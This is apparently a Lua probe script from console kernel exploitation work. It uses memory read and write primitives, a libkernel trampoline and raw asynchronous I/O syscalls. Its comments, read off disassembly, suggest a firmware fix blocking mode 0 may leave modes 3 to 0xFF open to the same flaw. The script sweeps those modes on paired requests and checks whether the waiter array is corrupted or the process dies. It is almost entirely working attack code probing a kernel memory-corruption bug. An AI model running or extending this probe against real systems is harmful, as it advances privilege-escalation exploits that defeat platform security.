-- CRASH_CLASS: MODERATE
-- PROBE 1235a: the 14.10 guard names mode 0. Does mode 3 walk into the same code?
--
-- 1219a/1221a measured: 663 ids,2,out,0,tb -> -1 EINVAL with out untouched; modes 1 and 2 accept
-- count 2 and write one status word per id. The 13.60 body decides at 0x3b078c:
--     mov eax,[rbx+0x2c] ; cmp eax,1 ; jne 0x3b0839
--                        ; cmp eax,2 ; jne 0x3b08e5
-- so mode 3..0xFF and mode 0 BOTH fall to 0x3b08e5, which reloads rcx=[rbx+0x40] every iteration
-- and links that single node onto every request. If 14.10's guard tests the value 0 rather than the
-- path, mode 3 reopens the exact shape the guard was written to close.
--
-- Control order matters: modes 0/1/2 first so their answers survive if a later mode kills the process.

print("=== PROBE 1235a: 663 mode space at count 2 ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function alive() local ok,v=pcall(function() return N(mk(20)()) end) if ok then return v end return -1 end

local pid0 = alive()
local lk = N(libkernel_base)
local TR = lk + 0x3B7
print(string.format("[0] pid=%d trampoline=0x%X", pid0, TR))

local ids = memory.alloc(64)
local out = memory.alloc(64)
local tb  = memory.alloc(8)
wd(tb, 0)

local function submit2()
    local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
    mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
    local fd0, fd1 = rd(sv), rd(sv+4)
    if fd0 <= 0 then return nil end
    local buf = memory.alloc(0x100)
    local ba = 0
    do local ok,v = pcall(function() return N(uint64(buf)) end) if ok then ba = v end end
    local reqs = memory.alloc(0x50)
    for i=0,0x4F,4 do wd(reqs+i,0) end
    for i=0,1 do
        local r = reqs + i*0x28
        wd(r+0x08,0x10)
        wd(r+0x10, ba % 4294967296) wd(r+0x14, math.floor(ba/4294967296))
        wd(r+0x20, fd0)
    end
    wd(ids,0) wd(ids+4,0)
    mk(669)(uint64(0x1001),uint64(reqs),uint64(2),uint64(3),uint64(ids))
    return fd0, fd1, rd(ids), rd(ids+4)
end

local MODES = {0,1,2,3,4,5,6,7,8,0x10,0x7F,0xFF}
for k = 1, #MODES do
    local mode = MODES[k]
    print(string.format("[%d] mode=0x%X", k, mode))
    local fd0, fd1, id0, id1 = submit2()
    if not fd0 then print("    socketpair failed") else
        print(string.format("    fds %d %d ids 0x%08X 0x%08X", fd0, fd1, id0, id1))
        wd(ids, id0) wd(ids+4, id1)
        wd(out,0xAAAAAAAA) wd(out+4,0xAAAAAAAA) wd(out+8,0xAAAAAAAA)
        local ok, rv = pcall(function() return native.fcall_with_rax(TR, 663, ids, 2, out, mode, tb, 0) end)
        if not ok then print("    PCALL-FAIL") else
            local h,l = hilo(rv)
            print(string.format("    ret=0x%08X_%08X err=%s out=%08X %08X %08X", h, l, ES(), rd(out), rd(out+4), rd(out+8)))
        end
        -- is the waiter array still coherent? count 1 must still answer
        wd(out,0xAAAAAAAA)
        local ok2, rv2 = pcall(function() return native.fcall_with_rax(TR, 663, ids, 1, out, 1, tb, 0) end)
        if ok2 then local h2,l2 = hilo(rv2)
            print(string.format("    probe count=1 mode=1 ret=0x%08X_%08X out=%08X", h2, l2, rd(out)))
        else print("    count=1 PCALL-FAIL") end
        -- complete both requests and look for damage
        local one = memory.alloc(8) wd(one, 0x51515151)
        mk(3)(uint64(fd1), uint64(one), uint64(4))
        local st = memory.alloc(16)
        wd(ids, id0) wd(ids+4, id1)
        local ok3 = pcall(function() return mk(664)(uint64(ids), uint64(2), uint64(st)) end)
        print(string.format("    after complete: 664 ok=%s states=%08X %08X pid=%d", tostring(ok3), rd(st), rd(st+4), alive()))
    end
end
print(string.format("[Z] pid_end=%d", alive()))
print("=== DONE ===")
